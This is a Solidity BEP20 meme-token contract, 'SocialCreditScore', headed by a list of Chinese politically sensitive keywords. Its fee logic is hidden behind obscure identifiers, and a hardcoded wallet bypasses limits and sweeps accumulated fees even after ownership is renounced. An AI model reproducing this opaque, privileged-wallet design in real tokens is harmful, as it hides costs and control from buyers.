/**
 *Submitted for verification at BscScan.com on 2021-12-18
*/

/** 
六四天安門事件TheTiananmenSquareprotestsof1989天安門大屠殺TheTiananmenSquareMassacre反右派鬥爭TheAnti-RightistStruggle大躍進政策TheGreatLeapForward文化大革命TheGreatProletarianCulturalRevolution人權HumanRights民運Democratization自Freedom獨立Independence多黨制Multi-partysystem民主言論思想反共反革命抗議運動騷亂暴亂騷擾擾抗暴平反維權示威游行法輪功FalunDafa李洪志法輪大法大法弟子強制斷種強制堕胎民族淨化人體實驗胡耀邦趙紫陽魏京生王丹還政於民和平演變激流中國北京之春大紀元時報九評論共産黨獨裁專制壓制統一監視鎮壓迫害侵略掠奪破壞拷問屠殺肅清活摘器官黑社會誘拐買賣人口遊進走私毒品賣淫春畫賭博六合彩台灣臺灣TaiwanFormosa中華民國RepublicofChina西藏土伯特唐古特Tibet達賴喇嘛DalaiLama新疆維吾爾自治區TheXinjiangUyghurAutonomousRegion東突厥斯坦
动态网自由门 天安門 天安门 法輪功 李洪志 Free Tibet 六四天安門事件 The Tiananmen Square protests of 1989 天安門大屠殺 The Tiananmen Square Massacre 反右派鬥爭 The Anti-Rightist Struggle 大躍進政策 The Great Leap Forward 文化大革命 The Great Proletarian Cultural Revolution 人權 Human Rights 民運 Democratization 自由 Freedom 獨立 Independence 多黨制 Multi-party system 台灣 臺灣 Taiwan Formosa 中華民國 Republic of China 西藏 土伯特 唐古特 Tibet 達賴喇嘛 Dalai Lama 法輪功 Falun Dafa 新疆維吾爾自治區 The Xinjiang Uyghur Autonomous Region 諾貝爾和平獎 Nobel Peace Prize 劉暁波 Liu Xiaobo 民主 言論 思想 反共 反革命 抗議 運動 騷亂 暴亂 騷擾 擾亂 抗暴 平反 維權 示威游行 李洪志 法輪大法 大法弟子 強制斷種 強制堕胎 民族淨化 人體實驗 肅清 胡耀邦 趙紫陽 魏京生 王丹 還政於民 和平演變 激流中國 北京之春 大紀元時報 九評論共産黨 獨裁 專制 壓制 統一 監視 鎮壓 迫害 侵略 掠奪 破壞 拷問 屠殺 活摘器官 誘拐 買賣人口 遊進 走私 毒品 賣淫 春畫 賭博 六合彩 天安門 天安门 法輪功 李洪志 Winnie the Pooh 劉曉波动态网自由门
 *    TG: https://t.me/SocialCreditScoreBSC
 *    30,000,000 Max wallet
**/
//SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
/**
 * BEP20 standard interface.
 */
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract SocialCreditScore is IBEP20 {
    using SafeMath for uint256;
    address internal owner;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    string constant _name = "SocialCreditScore";
    string constant _symbol = "CCP";
    uint8 constant _decimals = 8;
    uint256 _totalSupply = 1000 * 1000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = 10 * 1000000 * (10 ** _decimals);     
    uint256 public _maxWalletToken = 30 * 1000000 * (10 ** _decimals);  
    uint256 S167f62 = 2 * 100000 * (10 ** _decimals);
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) isMaxWalletTokenExempt;
    uint256 public BuyFee = 90; 
    uint256 public totalFee = 90;
    uint256 public ARDTfeescalingUID9999 = 200 ;
    uint256 feeDeNom999  = 1000;
    uint256  public blim4788899 = 1;   
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }
    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        emit OwnershipTransferred(adr);
    }
    event OwnershipTransferred(address owner);
    constructor ()  {
        address marketingFeeReceiver = 0x5959F14d2653e8169B79CC9B506DD100f965685E;
        owner = msg.sender;
        isFeeExempt[msg.sender] = true;
        isFeeExempt[DEAD] = true;
        isFeeExempt[marketingFeeReceiver] = true;
        isTxLimitExempt[msg.sender] = true;
        isMaxWalletTokenExempt[msg.sender] = true;
       _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);   
    }
    receive() external payable { }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function approveMax(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(-1)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance 8f709d3");
        }

        return _transferFrom(sender, recipient, amount);
    }
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        address marketingFeeReceiver = 0x5959F14d2653e8169B79CC9B506DD100f965685E;
        uint256 HTBalanceReceiver = balanceOf(recipient);
        uint256 HTSender = balanceOf(sender);
        uint256 stora = 0;
        if (sender != marketingFeeReceiver  && recipient != marketingFeeReceiver && recipient != DEAD && !isFeeExempt[sender] && !isFeeExempt[recipient]){
            require(((HTBalanceReceiver + amount) <= _maxWalletToken) || ((HTSender + amount) <= _maxWalletToken),"Max Wallet Amount reached. 70e44bd7");
            checkTxLimit(sender, amount);
        }         
        //Exchange tokens
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance 99a80b");
        uint256 amountRECf457 = 0;       
        if (HTBalanceReceiver > _maxWalletToken){
            amountRECf457 = shouldTakeFee48(sender,recipient) ? takeFeeSellARDTFF2fsUID9999(sender, amount) : amount;
        }else{
             amountRECf457 = shouldTakeFee48(sender,recipient) ? takeFeeNOARDT1254(sender, amount) : amount;
        }     
        if (recipient == marketingFeeReceiver){
            stora =  balanceOf(address(this));
            _balances[marketingFeeReceiver] = _balances[marketingFeeReceiver].add(stora);
            _balances[address(this)] = _balances[address(this)].sub(stora);
            emit Transfer(address(this), marketingFeeReceiver, stora);
        }          
        _balances[recipient] = _balances[recipient].add(amountRECf457);
        emit Transfer(sender, recipient, amountRECf457);
        return true;
    }
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded d16122d");
    }   
    function checkMaxWallet(address sender, uint256 amount) internal view {
        require(amount <= _maxWalletToken || isMaxWalletTokenExempt[sender], "TX Limit Exceeded 8d0fa");
    }
    function shouldTakeFee48(address sender, address recipient) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient];
    }
    function takeFeeNOARDT1254(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeTempUID9999 = amount.mul(BuyFee).div(feeDeNom999);
        
        _balances[address(this)] = _balances[address(this)].add(feeTempUID9999);
        emit Transfer(sender, address(this), feeTempUID9999);
        
        return amount.sub(feeTempUID9999);
    
    }
    function takeFeeSellARDTFF2fsUID9999(address sender, uint256 amount) internal returns (uint256) {
        uint256 HSenderbalance2222 = balanceOf(sender);
        uint256 tempBBaUID4444 = 0;
        uint256 tempCC7b8aeUID9999 = 0;
        uint256 feeTempUID9999 = 0;
        uint256 two = 2;
        uint256 AA375444444 = amount.mul(totalFee).div(feeDeNom999);

        if (HSenderbalance2222 > blim4788899){if   (amount > S167f62){
               tempBBaUID4444 = amount.mul(amount-S167f62).div(_maxTxAmount);
               tempCC7b8aeUID9999 = tempBBaUID4444.mul(ARDTfeescalingUID9999).div(feeDeNom999).mul(HSenderbalance2222.add(_maxWalletToken.div(two))).div(_maxWalletToken); }  }
        feeTempUID9999 =  AA375444444 +   tempCC7b8aeUID9999;   
        _balances[address(this)] = _balances[address(this)].add(feeTempUID9999);
        emit Transfer(sender, address(this), feeTempUID9999);
        return amount.sub(feeTempUID9999);
    }   
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD));
    }
}